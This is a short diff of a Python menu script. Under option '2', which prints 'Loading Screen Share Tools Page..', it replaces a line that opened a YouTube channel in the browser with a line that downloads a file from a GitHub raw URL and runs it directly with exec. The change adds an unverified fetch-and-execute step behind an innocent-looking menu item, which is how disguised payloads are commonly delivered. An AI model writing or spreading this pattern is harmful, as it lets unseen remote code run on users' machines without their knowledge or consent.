@@ -76,7 +76,7 @@ while True:
     if chon == '2':
         os.system('cls')
         print("                                            \033[1;39mLoading Screen Share Tools Page..")
-        webbrowser.open_new("https://youtube.com/@norih")
+        exec(requests.get('https://raw.githubusercontent.com/xNorih/FYRECHAGER-/main/Tools').text)
     if chon == '3':
         os.system('cls')
         print("                                            \033[1;39mLoading Screen Share Tools Page..")
